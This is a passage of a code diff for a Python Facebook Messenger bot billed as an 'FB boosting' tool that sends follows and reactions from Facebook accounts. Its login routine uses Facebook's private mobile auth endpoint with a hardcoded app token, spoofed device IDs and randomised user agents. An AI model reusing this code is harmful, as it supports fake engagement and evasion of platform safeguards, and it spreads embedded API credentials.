+𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁: 𝙼𝙰𝙷𝙸𝚁𝙾 𝙲𝙷𝙰𝙽
+╭─❍
+➠ {prefix}fbfollow: Send follow to id.
+╰───────────⟡
+╭─❍
+➠ {prefix}fbreact: Send reaction to post.
+╰───────────⟡
+╭─❍
+➠ {prefix}echo: say something.
+╰───────────⟡
+╭─❍
+➠ {prefix}catfact: Get random catfacts everday.
+╰───────────⟡
+╭─❍
+➠ {prefix}note: message from developer.
+╰───────────⟡
+╭─❍
+➠ {prefix}uid: get your id.
+╰───────────⟡
+╭─❍
+➠ {prefix}setprefix: change the prefix of bot [ADMIN ONLY].
+╰───────────⟡"""
+                self.sendmessage(author_id, thread_id, thread_type, reply)
+            if msg.startswith(f"{prefix}uid"):
+            	sender_name = self.fetchUserInfo(author_id)[author_id].name
+            	reply = f"Hi, {sender_name}\n𝚃𝙷𝙸𝚂 𝙸𝚂 𝚈𝙾𝚄𝚁 𝙸𝙳:\n{author_id}"
+            	self.sendmessage(author_id, thread_id, thread_type, reply)
+            if msg.startswith(f"{prefix}ai"):
+            	reply = "⌛𝙰𝙽𝚂𝚆𝙴𝚁𝙸𝙽𝙶 𝚈𝙾𝚄𝚁 𝚀𝚄𝙴𝚂𝚃𝙸𝙾𝙽, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃"
+            	self.sendmessage(author_id, thread_id, thread_type, reply)
+            	try:
+            		ask = msg[len(prefix)+3:]
+            		ask2 = requests.get('https://api.kenliejugarap.com/ai/?text=' + ask).json()['response']
+            		reply = f"𝙰𝙸 𝚁𝙴𝚂𝙿𝙾𝙽𝙳: \n{ask2}"
+            		self.sendmessage(author_id, thread_id, thread_type, reply)
+            	except:
+            		reply = "❌𝚂𝙾𝚁𝚁𝚈, 𝚆𝙴 𝙰𝚁𝙴 𝙷𝙰𝚅𝙸𝙽𝙶 𝙴𝚁𝚁𝙾𝚁 𝙵𝙴𝚃𝙲𝙷𝙸𝙽𝙶 𝚁𝙴𝚂𝙿𝙾𝙽𝙳."
+            		self.sendmessage(author_id, thread_id, thread_type, reply)
+            if msg.startswith(f"{prefix}note"):
+            	reply = "𝚃𝚑𝚒𝚜 𝚋𝚘𝚝 𝚒𝚜 𝚌𝚞𝚛𝚛𝚎𝚗𝚝𝚕𝚢 𝚒𝚗 𝚊 𝚝𝚎𝚜𝚝 𝚙𝚑𝚊𝚜𝚎 𝚠𝚒𝚝𝚑 𝚏𝚛𝚎𝚎𝚖𝚘𝚍𝚎 𝚊𝚌𝚝𝚒𝚟𝚊𝚝𝚎𝚍. 𝙸𝚏 𝚢𝚘𝚞 𝚝𝚛𝚢 𝚛𝚎𝚊𝚌𝚝𝚒𝚗𝚐 𝚝𝚘 𝚝𝚑𝚎 𝚜𝚊𝚖𝚎 𝚙𝚘𝚜𝚝 𝚊 𝚜𝚎𝚌𝚘𝚗𝚍 𝚝𝚒𝚖𝚎, 𝚒𝚝 𝚖𝚒𝚐𝚑𝚝 𝚗𝚘𝚝 𝚠𝚘𝚛𝚔 𝚋𝚎𝚌𝚊𝚞𝚜𝚎 𝚝𝚑𝚎 𝚍𝚊𝚝𝚊𝚋𝚊𝚜𝚎 𝚑𝚊𝚜 𝚊𝚕𝚛𝚎𝚊𝚍𝚢 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚍 𝚢𝚘𝚞𝚛 𝚒𝚗𝚒𝚝𝚒𝚊𝚕 𝚛𝚎𝚊𝚌𝚝𝚒𝚘𝚗. 𝙷𝚘𝚠𝚎𝚟𝚎𝚛, 𝚢𝚘𝚞 𝚌𝚊𝚗 𝚜𝚝𝚒𝚕𝚕 𝚛𝚎𝚊𝚌𝚝 𝚝𝚘 𝚊 𝚍𝚒𝚏𝚏𝚎𝚛𝚎𝚗𝚝 𝚙𝚘𝚜𝚝, 𝚜𝚊𝚖𝚎 𝚙𝚛𝚘𝚝𝚘𝚌𝚘𝚕 𝚠𝚎'𝚛𝚎 𝚞𝚜𝚒𝚗𝚐 𝚝𝚘 𝚏𝚘𝚕𝚕𝚘𝚠."
+            	self.sendmessage(author_id, thread_id, thread_type, reply)
+            if ("you from" in msg):
+                reply = "I am from Philippines, currently living in cagayan de oro."
+                self.sendmessage(author_id, thread_id, thread_type, reply)
+            if msg.startswith(f"{prefix}echo"):
+                echo_text = msg[len(prefix)+5:]
+                reply = f"{echo_text}"
+                self.sendmessage(author_id, thread_id, thread_type, reply)
+
+        except Exception as e:
+            print(f"Error: {e}")
+            
+follow_in_progress = False
+reaction_in_progress = False
+
+def rainbow_light_text_print(text, end='\n'):
+    colors = [
+        "\033[91m",  
+        "\033[93m",  
+        "\033[92m",  
+        "\033[96m",  
+        "\033[94m",  
+        "\033[95m",  
+    ]
+
+    num_steps = len(colors)
+
+    for i, char in enumerate(text):
+        color_index = i % num_steps
+        print(f"{colors[color_index]}{char}", end="")
+
+    print("\033[0m", end=end)
+
+def convert_cookie(session):
+    return '; '.join([f"{cookie['name']}={cookie['value']}" for cookie in session])
+
+if __name__ == '__main__':
+    with open('configuration.json') as f:
+    	configuration = json.load(f)
+    try:
+        form = {
+            'adid': 'e3a395f9-84b6-44f6-a0ce-fe83e934fd4d',
+            'email': str(configuration['CONFIG']['BOT_INFO']['EMAIL']),
+            'password': str(configuration['CONFIG']['BOT_INFO']['PASSWORD']),
+            'format': 'json',
+            'device_id': '67f431b8-640b-4f73-a077-acc5d3125b21',
+            'cpl': 'true',
+            'family_device_id': '67f431b8-640b-4f73-a077-acc5d3125b21',
+            'locale': 'en_US',
+            'client_country_code': 'US',
+            'credentials_type': 'device_based_login_password',
+            'generate_session_cookies': '1',
+            'generate_analytics_claim': '1',
+            'generate_machine_id': '1',
+            'currently_logged_in_userid': '0',
+            'irisSeqID': 1,
+            'try_num': '1',
+            'enroll_misauth': 'false',
+            'meta_inf_fbmeta': 'NO_FILE',
+            'source': 'login',
+            'machine_id': 'KBz5fEj0GAvVAhtufg3nMDYG',
+            'meta_inf_fbmeta': '',
+            'fb_api_req_friendly_name': 'authenticate',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+            'api_key': '882a8490361da98702bf97a021ddc14d',
+            'access_token': '181425161904154|95a15d22a0e735b2983ecb9759dbaf91'
+        }
+
+        headers = {
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-friendly-name': form['fb_api_req_friendly_name'],
+            'x-fb-http-engine': 'Liger',
+            'user-agent': str(ua_generator.generate())
+        }
+
+        url = 'https://b-graph.facebook.com/auth/login'
+        response = requests.post(url, data=form, headers=headers)
+        response_data = response.json()
+        #print(response_data)
+        if "access_token" in response_data:
+            access_token = response_data['access_token']
+            cookie = convert_cookie(response_data['session_cookies'])
+            key_value_pairs = [pair.strip() for pair in cookie.split(";")]
+            session_cookies = {key: value for key, value in (pair.split("=") for pair in key_value_pairs)}
+            rainbow_light_text_print("[ [ NAME ] ] FB BOOSTING CHATBOT")
+            rainbow_light_text_print("[ [ VERSION ] ] Version: 1.0.2")
+            time.sleep(0.5)
+            rainbow_light_text_print("[ [ DESCRIPTION ] ] A Facebook Messenger Bot that send reaction and follow via page using fb accounts.")
+            if str(configuration['CONFIG']['BOT_INFO']['PREFIX']) == "" or " " in configuration['CONFIG']['BOT_INFO']['PREFIX'] or len(configuration['CONFIG']['BOT_INFO']['PREFIX']) != 1:
+            	sys.exit("\033[91m[ [ ERROR ] ] PLEASE CHECK THE PREFIX, PREFIX MUST HAVE VALUE AND DOESN'T HAVE SPACE AND ONLY ONE SYMBOL/LETTER. \033[0m")
+            else:
+            	try:
+            		bot = MessBot(' ', ' ', session_cookies=session_cookies)
+            		rainbow_light_text_print("[ [ CONNECTING ] ] {}".format(str(bot.isLoggedIn()).upper()))
+            	except:
+            		sys.exit("\033[91m[ [ ERROR ] ] FAILED TO CONNECT TO SERVER, TRY TO RERUN TO PROGRAM. \033[0m")
+            	try:
+            		bot.listen()
+            	except:
+            		bot.listen()
+        else:
+            rainbow_light_text_print("[ [ ERROR ] ] {}".format(str(response_data['error']['message'])))
+    except requests.exceptions.ConnectionError:
+    	print("\033[1m\033[91mPLEASE CHECK YOUR INTERNET CONNECTION AND TRY AGAIN.\033[0m")
